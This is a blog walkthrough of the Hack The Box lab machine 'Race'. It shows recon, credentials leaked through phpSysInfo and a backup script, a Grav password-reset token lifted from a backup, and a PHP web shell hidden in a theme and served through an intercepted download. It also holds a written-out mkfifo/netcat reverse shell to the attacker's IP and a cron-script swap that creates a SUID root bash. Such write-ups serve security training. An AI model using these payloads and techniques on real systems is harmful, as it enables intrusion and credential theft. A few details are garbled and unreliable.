---
title: Race
date: 2026-02-26
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
  - hard
  - Directory-Brute-Force-Feroxbuster-n
  - CMS-Grav-RCE
  - CMS-phpSysInfo-Data-Leak
  - CMS-Grav-Data-Leak
  - SSH-login-error
  - Linux-Privilege-Escalation-directory-ownership-error
lastmod: 2026-03-11T14:37:17.813Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Race" >}}

***

# Recon 10.129.234.X

### PORT & IP SCAN

The `nmap` reveal that the machine is a standard Linux  Server , with port 22 ,and WEB  80 open

```
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.209 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-27 23:36 -0500
Nmap scan report for 10.129.234.209
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:b0:1e:c5:e8:81:5c:94:39:ed:37:7e:21:cf:b1:a8 (ECDSA)
|_  256 37:a3:d3:cd:35:dc:cc:d8:db:3c:c3:4d:ad:22:29:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds

```

***

### Web Recon 80

### Tech stack

The website is teched by the Grav and Apache

![Pasted image 20260228124400.png](/ob/Pasted%20image%2020260228124400.png)

```
HTTP/1.1 200 OK
Date: Sat, 28 Feb 2026 04:43:17 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: grav-site-09f1269=6uc709lko5c2qhinueon58ahep; expires=Sat, 28-Feb-2026 05:13:17 GMT; Max-Age=1800; path=/racers/; domain=10.129.234.209; HttpOnly; SameSite=Lax
Expires: Sat, 07 Mar 2026 04:43:17 GMT
Cache-Control: max-age=604800
Pragma: no-cache
ETag: "63615382783200e59481e1e26cd19ae7"
Content-Length: 11411
Connection: close
Content-Type: text/html;charset=UTF-8
```

# Shell as WWW

### WebSite Directory BurteForce

{{< toggle "Tag 🏷️" >}}

{{< tag "Directory-Brute-Force-Feroxbuster-n" >}} feroxbuster run with `-n` to not recurse for avoiding finding a *ton* of stuff in there .

{{< /toggle >}}

found the `phpinfo`

```
└─# feroxbuster -u http://10.129.234.209/ -x php -n 
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.209/
 🚩  In-Scope Url          │ 10.129.234.209
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       16w      163c http://10.129.234.209/
401      GET       14l       54w      461c http://10.129.234.209/phpsysinfo
[####################] - 3m     60002/60002   0s      found:2       errors:0      
[####################] - 3m     60000/60000   358/s   http://10.129.234.209/     
```

### phpSysInfo

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-phpSysInfo-Data-Leak" >}}  Found the CMS phpSysInfo that is allowed the weak password admin : admin login ,and host system information display. It includes a process list,and looking at the tree under cron, there’s a backup job with a password

{{< /toggle >}}

Found the `phpinfo` , and the weak password is admin:admin

![Pasted image 20260228125601.png](/ob/Pasted%20image%2020260228125601.png)

Found the command `backup` : `Wedobackupswithsecur3password5` in the crontab

```
/usr/bin/curl --insecure --connect-timeout 60 -u backup:Wedobackupswithsecur3password5.Noonecanhackus! -T /var/www/html/racers/backup/ sftp://offsite-backup.race.vl/backups/
```

![Pasted image 20260228125745.png](/ob/Pasted%20image%2020260228125745.png)

But ssh is dont work

![Pasted image 20260228130230.png](/ob/Pasted%20image%2020260228130230.png)

However the  `backup` : `Wedobackupswithsecur3password5.Noonecanhackus!`  is work in `/racers/admin` for the Grave CMS

![Pasted image 20260228130359.png](/ob/Pasted%20image%2020260228130359.png)

### Grav Backup File

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-Grav-Data-Leak" >}} Login the Grav CMS with previous data leak ,After login , the function of back up is available , and the backup file of /user/account/username.yaml, the hashcat cant work in here due to require 32 word password ,but there is the reset token cane be stolen to have more functionable account updrage.

{{< /toggle >}}

For the login the CMS , we always looking for the the function of these

Check List

* TCB = To Be Comfired

| CMS Abuse                                   | Result |
| ------------------------------------------- | ------ |
| Command Execute                             | N/A    |
| Backup File                                 | Yes    |
| CMS github source code review               | TCB    |
| someone who other person have more function | TCB    |
| Theme injection                             | TCB    |
| CVE                                         | TCB    |

![Pasted image 20260228130531.png](/ob/Pasted%20image%2020260228130531.png)

Backup File\
In the page of the backup function , there is the back up file for us to download.\
![Pasted image 20260306234202.png](/ob/Pasted%20image%2020260306234202.png)

We get the long file directory , and for the short time to know that i will check these top file first base on my experience.

We do have the user of admin , backup , patrick.yaml , and now we have the backup account , the remember that the password require that need 32 words , so the method of brute-force us useless

![Pasted image 20260306235456.png](/ob/Pasted%20image%2020260306235456.png)![Pasted image 20260306235525.png](/ob/Pasted%20image%2020260306235525.png)

But the `patrick.yaml` has the reset keyword in here , it will remind me to play with the reset function

### Grav Reset Function

![Pasted image 20260307000058.png](/ob/Pasted%20image%2020260307000058.png)

![Pasted image 20260307000111.png](/ob/Pasted%20image%2020260307000111.png)

i will search the function of the forget password, and the `user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:` by `grep -r '/forgot'` to know how can the token run

```
┌──(parallels㉿kali-linux-2025-2)-[~/Downloads]
└─$ grep -r '/forgot'
user/plugins/admin/themes/grav/templates/partials/login-form.html.twig:        <a class="button secondary" href="{{ admin_route('/forgot') }}"><i class="fa fa-exclamation-circle"></i> {{ 'PLUGIN_ADMIN.LOGIN_BTN_FORGOT'|t }}</a>
user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:            return $this->createRedirectResponse('/forgot');
user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:                    return $this->createRedirectResponse('/forgot');
user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:        return $this->createRedirectResponse('/forgot');
user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:            return $this->createRedirectResponse('/forgot');
user/plugins/login/README.md:route_forgot: '/forgot_password'            # Route for the forgot password process
user/plugins/login/login.php:            $this->login->getRoute('forgot') ?: '/forgot_password',
user/plugins/login/templates/forgot.html.twig:    {% include 'partials/forgot-form.html.twig' %}
user/plugins/login/blueprints.yaml:              placeholder: "/forgot_password"
user/plugins/login/login.yaml:route_forgot: '/forgot_password'            # Route for the forgot password process
grep: default_site_backup--20260306154028.zip: binary file matches


```

There is the link for taki.ng the token form the username.yaml

![Pasted image 20260307000817.png](/ob/Pasted%20image%2020260307000817.png)

The Reset link is made by username and the token , so i need the token now , and the `patrick.yaml` has the reset token look like

![Pasted image 20260307001228.png](/ob/Pasted%20image%2020260307001228.png)

Oh , it say it is expired , so i may download the new backup file for check the reset token again

![Pasted image 20260307001301.png](/ob/Pasted%20image%2020260307001301.png)

The timestamp in my backup is from 2023, which is clearly expired. I’ll request a reset as patrick using the site (it will say the email failed to send, but that’s fine), and then download another backup. I can extract just the `patrick.yaml` file, and the code is different from before:

![Pasted image 20260307002520.png](/ob/Pasted%20image%2020260307002520.png)

go to the download and unzip the only file

```
unzip default_site_backup--20260306162037.zip  user/accounts/patrick.yaml
```

![Pasted image 20260307002556.png](/ob/Pasted%20image%2020260307002556.png)

paste in your  `http://yourip/racers/admin/reset/u/patrick/99dbabf226PleaseChnageMe` and do the reset

![Pasted image 20260307002702.png](/ob/Pasted%20image%2020260307002702.png)

### Grav Theme injection

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-Grav-RCE" >}} Login the Grav CMS with previous data leak with the account upgarde ,After login , the function of theme install in avaible which is allow me to do the Man-In-the-medium-attack to modify the theme as the malicious theme to have the RCE\
{{< /toggle >}}

Check List

* TCB = To Be Comfired

| CMS Abuse                                   | Result |
| ------------------------------------------- | ------ |
| Command Execute                             | N/A    |
| Backup File                                 | N/A    |
| CMS github source code review               | TCB    |
| someone who other person have more function | TCB    |
| Theme injection                             | YES    |
| CVE                                         | TCB    |

```
git clone https://github.com/getgrav/grav-theme-photographer.git
```

```
echo '<IfModule mod_rewrite.c>\nRewriteEngine Off\n</IfModule>' > grav-theme-photographer/img/.htaccess
```

```
echo '<?php echo system($_GET[0]); ?>' > grav-theme-photographer/img/cmd.php
```

```
zip -r pwn.zip grav-theme-photographer
```

We can see that we are allowed to install themes and plugins, we can clone a simple theme (grav\
theme photographer) and add malicious PHP code that can help us gain a reverse shell.\
However, the box does not have an internet connection, so to install any plugins/themes, we\
must do so via a proxy.

Open the burpsuite to do the setting for the listening all interfaces.

![Pasted image 20260307112217.png](/ob/Pasted%20image%2020260307112217.png)

![Pasted image 20260307112254.png](/ob/Pasted%20image%2020260307112254.png)

In the Grav , pointing the Proxy URL to you ip with the burpsuite port 8080

![Pasted image 20260307113914.png](/ob/Pasted%20image%2020260307113914.png)

Add our malicious theme

![Pasted image 20260307114031.png](/ob/Pasted%20image%2020260307114031.png)

Choose the Aerial theme

![Pasted image 20260307114046.png](/ob/Pasted%20image%2020260307114046.png)

Open the burpsuite Intercept

![Pasted image 20260307114228.png](/ob/Pasted%20image%2020260307114228.png)

The response has the Location header; we will change it to point to our HTTP server, which is\
serving the archive containing the malicious PHP code

```
python3 -m http.server 80
```

Keep Forward until find the link like the `/download/themes/aerial/2.0.4`

![Pasted image 20260307141521.png](/ob/Pasted%20image%2020260307141521.png)

left click to do the `response to this request`

![Pasted image 20260307141705.png](/ob/Pasted%20image%2020260307141705.png)

Now we can modify the response

![Pasted image 20260307141742.png](/ob/Pasted%20image%2020260307141742.png)

To change the link\
![Pasted image 20260307141956.png](/ob/Pasted%20image%2020260307141956.png)

after you finish edit , move your mouse you another side ; otherwise it maybe dont work

![Pasted image 20260307143637.png](/ob/Pasted%20image%2020260307143637.png)

Receive the download request

![Pasted image 20260307143422.png](/ob/Pasted%20image%2020260307143422.png)

Dont need to install , you can directly go to this link with -->\
http://10.129.234.209/racers/user/themes/aerial/img/cmd.php?0=id

![Pasted image 20260307144406.png](/ob/Pasted%20image%2020260307144406.png)

# Shell as MAX

```
nc -lvnp 9001
```

In the browser , i do it in the revshell.com\
http://10.129.234.209/racers/user/themes/aerial/img/cmd.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.10.16.30%209001%20%3E%2Ftmp%2Ff

Now we are the user of www-user

```
$ ls -al
total 36
drwxr-xr-x 5 max  max  4096 Dec  9  2023 .
drwxr-xr-x 4 root root 4096 Dec  3  2023 ..
lrwxrwxrwx 1 root root    9 Dec  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 max  max  3771 Jan  6  2022 .bashrc
drwx------ 2 max  max  4096 Dec  3  2023 .cache
drwxrwxr-x 3 max  max  4096 Dec  9  2023 .local
-rw-r--r-- 1 max  max   807 Jan  6  2022 .profile
drwxrwxr-x 2 max  max  4096 Dec  4  2023 bin
lrwxrwxrwx 1 max  max    29 Dec  9  2023 race-scripts -> /usr/local/share/race-scripts
-rw-r----- 1 root max    33 Mar  6 11:34 user.txt
$ ls
bin
race-scripts
user.txt
```

Under the max directory , there is the `race-scripts` which show the password with the max , so we login in the SSh

### Script password data leak

```
$ cd /usr/local/share/race-scripts
$ ls
backup
offsite-backup.sh
$ cat offsite-backup.sh
#!/usr/bin/bash

OFFSITE_HOST="offsite-backup.race.vl"
SOURCE_DIR="/var/www/html/racers/backup/"
# Disabled USER/PASS for security reasons. Will be provided via environment from cron.
# OFFSITE_USER="max"
# OFFSITE_PASS="ruxai0GaemaS1Rah"
/usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T $SOURCE_DIR sftp://$OFFSITE_HOST/backups/
$ 
```

```
OFFSITE_HOST="offsite-backup.race.vl"
SOURCE_DIR="/var/www/html/racers/backup/"
# Disabled USER/PASS for security reasons. Will be provided via environment from cron.
# OFFSITE_USER="max"
# OFFSITE_PASS="ruxai0GaemaS1Rah"
/usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T $SOURCE_DIR sftp://$OFFSITE_HOST/backups/
$ su max
Password: ruxai0GaemaS1Rah
```

```
└─$ sshpass -p 'ruxai0GaemaS1Rah' ssh max@10.129.234.209
Host key verification failed.                                
```

{{< toggle "Tag 🏷️" >}}

{{< tag "SSH-login-error" >}} The ssh login error message with Host key verification failed.  That can be solve by -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/htb/race]
└─$ sshpass -p 'ruxai0GaemaS1Rah' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null max@10.129.234.209
Warning: Permanently added '10.129.234.209' (ED25519) to the list of known hosts.

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar  7 06:59:33 AM UTC 2026

  System load:  0.23              Processes:             238
  Usage of /:   66.3% of 8.26GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.234.209
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Mar 7 06:59:34 2026 from 10.10.16.30
max@race:~$ 
```

# Shell as root

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-directory-ownership-error" >}} After running the pspy to know that  the offsite-backup.sh  will run in every 30 second ,but max has ownership over this directory and the scripts in it, so I remove the old script , and create the pipe and use the tee to input the rev shell to have the shell

{{< /toggle >}}

### PSPY

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
```

```
max@race:~$ timeout  120 ./pspy64  -pf -i 1000
```

```shell
max@race:~$ timeout  120 ./pspy64  -pf -i 1000
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/03/07 15:57:48 CMD: UID=1001  PID=1686   | ./pspy64 -pf -i 1000 
2026/03/07 15:57:48 CMD: UID=1001  PID=1685   | timeout 120 ./pspy64 -pf -i 1000 
2026/03/07 15:57:48 CMD: UID=0     PID=1684   | 
2026/03/07 15:57:48 CMD: UID=0     PID=1677   | /usr/bin/curl --insecure --connect-timeout 60 -u backup:Wedobackupswithsecur3password5.Noonecanhackus! -T /var/www/html/racers/backup/ sftp://offsite-backup.race.vl/backups/                                                             
2026/03/07 15:57:48 CMD: UID=0     PID=1676   | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh 
2026/03/07 15:57:48 CMD: UID=0     PID=1672   | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh 
2026/03/07 15:57:48 CMD: UID=0     PID=1671   | /bin/sh -c /usr/local/bin/secure-cron-runner.sh >/dev/null 2>/dev/null 
44eec4e5a99b38797b0e94f6c/system.journal
2026/03/07 15:59:01 CMD: UID=0     PID=1710   | /usr/sbin/CRON -f -P 
2026/03/07 15:59:01 FS:                 OPEN | /tmp/#2150
2026/03/07 15:59:01 FS:                 OPEN | /etc/pam.d/cron
```

The offsite-backup.sh, secure-cron-runner.sh ,offsite-backup.sh will every 30 min to run

```
2026/03/07 15:58:01 FS:                 OPEN | /usr/local/share/race-scripts/offsite-backup.sh
2026/03/07 15:58:01 CMD: UID=0     PID=1701   | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh 
2026/03/07 15:58:01 FS:               ACCESS | /usr/local/share/race-scripts/offsite-backup.sh
```

### Cron

```
max@race:~$ cat  /usr/local/bin/secure-cron-runner.sh
#!/usr/bin/bash

## If scripts need environment variables put them into below file
## so that no one can see them.
. /root/conf/secure-cron-runner.env

declare -a scripts
declare -a sigs

## 0 = offsite-backup by max
scripts[0]="/usr/local/share/race-scripts/offsite-backup.sh"
sigs[0]="d15804b944b40ca8540d37ed6bd80906"
## add other scripts below
# scripts[1]="<path-to-script>"
# sigs[1]="<md5sum>"
# scripts[2]="<path-to-script>"
# sigs[2]="<md5sum>"

elems=${#scripts[@]}

for (( j=0; j<${elems}; j++ )) ; do
  sig=$(/usr/bin/md5sum ${scripts[$j]} | awk '{print $1}')
  if [[ "x$sig" == "x${sigs[$j]}" ]] ; then
    # echo "Script is safe. Running it." >> /var/log/secure-cron-runner.log
    ${scripts[$j]}
  else
    # echo "Script is not safe. Skipping it. Please contact patrick to update signature." >> /var/log/secure-cron-runner.log
    :
  fi
done

```

```
max@race:/usr/local/share/race-scripts$ mv offsite-backup.sh pipe
max@race:/usr/local/share/race-scripts$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/0xdf' | tee offsite-backup.sh
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 6777 /tmp/0xdf
max@race:/usr/local/share/race-scripts$ chmod +x offsite-backup.sh 
max@race:/usr/local/share/race-scripts$ cat backup/offsite-backup.sh > pipe 
max@race:/usr/local/share/race-scripts$ ls
backup  offsite-backup.sh  pipe
max@race:/usr/local/share/race-scripts$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1396520 Mar  7 17:38 /tmp/0xdf
max@race:/usr/local/share/race-scripts$ /tmp/0xdf -p
0xdf-5.1# whoami 
0xdf-5.1# root
```
